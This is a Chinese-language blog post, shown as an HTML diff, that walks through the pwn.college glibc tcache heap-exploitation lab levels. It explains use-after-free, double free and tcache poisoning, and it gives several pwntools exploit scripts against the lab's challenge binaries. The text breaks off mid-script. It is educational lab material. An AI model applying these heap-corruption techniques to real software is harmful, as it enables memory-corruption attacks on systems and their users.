@@ -1,0 +1,853 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Pi.png">
+  <link rel="icon" href="/img/Pi.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lobo Q1ng">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Dynamic Allocator MisuseThe glibc heap consists of many components distinct parts that balance performance and security. In this introduction to the heap, the thread caching layer, tcache will be targ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college: Dynamic Allocator Misuse">
+<meta property="og:url" content="https://loboq1ng.github.io/2025/04/21/pwn-college-Dynamic-Allocator-Misuse/index.html">
+<meta property="og:site_name" content="Q1ng&#39;s blog">
+<meta property="og:description" content="Dynamic Allocator MisuseThe glibc heap consists of many components distinct parts that balance performance and security. In this introduction to the heap, the thread caching layer, tcache will be targ">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-21T08:48:57.000Z">
+<meta property="article:modified_time" content="2025-05-11T08:56:04.584Z">
+<meta property="article:author" content="Lobo Q1ng">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>pwn.college: Dynamic Allocator Misuse - Q1ng&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"loboq1ng.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Q1ng&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Townscaper.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college: Dynamic Allocator Misuse"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-21 16:48" pubdate>
+          2025年4月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          114 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn.college: Dynamic Allocator Misuse</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Dynamic-Allocator-Misuse"><a href="#Dynamic-Allocator-Misuse" class="headerlink" title="Dynamic Allocator Misuse"></a>Dynamic Allocator Misuse</h3><p>The glibc heap consists of many components distinct parts that balance performance and security. In this introduction to the heap, the thread caching layer, <code>tcache</code> will be targeted for exploitation. <code>tcache</code> is a fast thread-specific caching layer that is often the first point of interaction for programs working with dynamic memory allocations.</p>
+<blockquote>
+<p>glibc堆由许多组件组成，这些组件是平衡性能和安全性的不同部分。在本文对堆（线程缓存层）的介绍中，缓存将成为开发的目标。Tcache是一种特定于线程的快速缓存层，它通常是处理动态内存分配的程序的第一个交互点。</p>
+</blockquote>
+<h4 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h4><p>了解tcache的结构，这是一个UAF。也就是先malloc，然后free，然后read_flag，那么read_flag的时候会复用最先的创建的chunk。当然这里有个前提，就是需要在同一个bin中。同一个bin中存放大小相同的chunk。关于tcache结构体的定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>
+
+<p>这个<code>TCACHE_MAX_BINS</code> 默认64（64位系统），每个bin存放大小相同的chunk。每个bin的大小范围：<code>bin[i]</code> 存放大小为 <code>16 + 16*i</code> 的块（如 <code>bin[0]</code>&#x3D;16字节，<code>bin[1]</code>&#x3D;32字节，…，<code>bin[63]</code>&#x3D;1032字节）。</p>
+<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>一样的，用ida打开看看malloc的size即可。</p>
+<h4 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h4><p>这题size是随机的，但是.0是可以直接看到的。所以逻辑没变。依然先malloc，再free，再read_flag</p>
+<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>这题就爆破一下bin就好了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level2.1&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">63</span>):<br>    size = <span class="hljs-number">32</span> + <span class="hljs-number">16</span>*i<br>    size = <span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-comment"># malloc</span><br>    out = p.recvuntil(<span class="hljs-string">b&#x27;[*] Function (malloc/free/puts/read_flag/quit): &#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;pwn.&quot;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">print</span>(out)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># payload = b&quot;malloc &quot;+ size</span><br>    <span class="hljs-comment"># print(payload)</span><br>    p.sendline(<span class="hljs-string">b&quot;malloc &quot;</span>+ size)<br>    <span class="hljs-comment"># free</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;[*] Function (malloc/free/puts/read_flag/quit): &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;free&quot;</span>)<br>    <span class="hljs-comment"># read_flag</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;[*] Function (malloc/free/puts/read_flag/quit): &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;read_flag&quot;</span>)<br>    <span class="hljs-comment"># puts</span><br>    p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/read_flag/quit): &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;puts&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h4><p>这题主要考虑是LIFO（后进先出）的free策略。例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">void</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第一次分配 347 字节</span><br>    <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第二次分配 347 字节</span><br>    <span class="hljs-built_in">free</span>(p1);                <span class="hljs-comment">// 释放 p1</span><br>    <span class="hljs-built_in">free</span>(p2);                <span class="hljs-comment">// 释放 p2</span><br>    <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第三次分配 347 字节</span><br>    <span class="hljs-type">void</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">347</span>);  <span class="hljs-comment">// 第四次分配 347 字节</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1=%p, p2=%p, p3=%p, p4=%p\n&quot;</span>, p1, p2, p3, p4);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>那么这种情况下的执行结果为：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">p1</span>=0x55a1a2b3c4d0, <span class="hljs-attribute">p2</span>=0x55a1a2b3c650, <span class="hljs-attribute">p3</span>=0x55a1a2b3c650, <span class="hljs-attribute">p4</span>=0x55a1a2b3c4d0<br></code></pre></td></tr></table></figure>
+
+<p>即<code>p3</code>复用<code>p2</code>，<code>p4</code>复用<code>p1</code>（这就是glibc的LIFO行为）</p>
+<blockquote>
+<p><code>free</code>后的内存进入<code>tcache</code>的流程：</p>
+<ol>
+<li><p>检查chunk大小，如果在1032字节内，则优先放入<code>tcache</code>中。</p>
+</li>
+<li><p>插入到<code>bin</code>的链表头部（LIFO策略）</p>
+<p>例如，free(ptr1)和free(ptr2)后，会变成<code>tcache-&gt;bins[size_class] → ptr2 → ptr1 → NULL</code>，那么下次malloc时会优先分配<code>ptr2</code>的chunk。</p>
+</li>
+<li><p>如果<code>bin</code>已满（超过7个），多余的chunk会进入<code>fastbin</code>或者<code>smallbin</code>（取决于大小）。</p>
+</li>
+</ol>
+</blockquote>
+<p>所以这题先a &#x3D; malloc(347), b &#x3D; malloc(347)。然后再free(a), free(b)。 再read_flag，再puts(a)就行了。</p>
+<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>方法相同</p>
+<h4 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h4><p>记住一点，free的时候只是判断chunk的key是否等于线程key而已。而线程key实际上是在创建时堆的tcache entry的地址。因此，在进行double free的时候，只需要覆盖掉key就行了。</p>
+<p>而key和next在user_data的起始地址。这是一个复用，也就是在<code>tcachebin</code>中（free后），user_data的起始地址会变成<code>next</code>的起始地址，其后紧跟着的是<code>key</code>。</p>
+<p>这里，可以通过scanf来将key覆盖掉，使其不等于线程key，从而可以进行二次free。</p>
+<p>也就是，先<code>malloc 223</code>，然后<code>free</code>，然后再<code>scanf</code>，再输入一个长度大于8的字符串，然后再<code>free</code>，此时在<code>tcache bin</code>中就有两项，并且地址相同。那么这时候再使用<code>read_flag</code>即可。最后<code>puts</code>拿到flag</p>
+<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>思路一致</p>
+<h4 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h4><p>这里ida打开查看源码，发现puts_flag的选项是直接打印出flag。但是有一个验证，也就是需要flag所在的chunk中，前16字节有数据。</p>
+<p>但是，它有一个操作，就是<code>read_flag</code>每次<code>malloc</code>的时候都会将前8个字节直接置0，从而导致无法<code>puts_flag</code>。所以，需要将<code>read_flag</code>的<code>chunk</code>进行<code>free</code>，使其进入<code>bin</code>中，如果<code>read_flag</code>的<code>chunk</code>进入<code>tcache_bin</code>中时，<code>tcache_bin</code>为空的话那么<code>next</code>依然为空，还是无法通过<code>puts_flag</code>进行读取，因此要保证进入<code>tcache_bin</code>时，其不为空才行。</p>
+<p>思路就是：先<code>malloc</code>两个chunk，然后再<code>free</code>掉。再使用<code>read_flag</code>将其中一个chunk给覆盖flag。然后再free掉，此时read_flag就进入了<code>tcache_bin</code>，且此时其不为空，next有值。那么就可以<code>puts_flag</code>了。</p>
+<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h4><p>思路一致：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): malloc 0 472<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): malloc 1 472<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): free 0<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): free 1<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): read_flag<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): free 1<br>[*] <span class="hljs-keyword">Function</span> <span class="hljs-title"></span>(malloc/free/puts/read_flag/puts_flag/quit): puts_flag<br></code></pre></td></tr></table></figure>
+
+<h4 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h4><p>这题需要我们暴露secret，然后执行<code>send_flag</code>再输入这个secret就可以拿到flag了。</p>
+<p>思路是：<code>malloc</code>两次，然后再<code>free</code>两次。最后<code>scanf</code>把leak的地址写入next中，然后再malloc两次这样就拿到secret的数据，再puts出来，然后就可以用<code>send_flag</code>了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level6.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x428d30</span>))<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;puts 0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h4><p>这题也是同理，但是leak_address需要改一下，因为这题没有开启PIE，也就是用ida打开就能拿到地址了。</p>
+<h4 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h4><p>除了泄露外（我尝试了一下泄露，但是发现16字节的情况下，key会在每次malloc后被修改，所以还是直接scanf将secret的地址直接改成其他数据方便），其实我们可以用scanf修改secret地址的值，然后send_flag时输入我们之前修改的值就能绕过了。</p>
+<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h4><p>思路一致，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level7.1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br><br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p32(<span class="hljs-number">0x424a2a</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h4><p>如果你想要poison的最低字节地址中，有换行符、水平制表符等会隔绝scanf读入的值的话，可以考虑申请与你想申请的地址相近的其他地址绕过。</p>
+<p>这里无非就是从更低的地址写入更多的数据覆盖。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level8.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br><br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br><span class="hljs-comment"># 因为0a,09都会截断输入，所以用08。那么相应的后面输入多覆盖两个字节。</span><br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x426608</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span 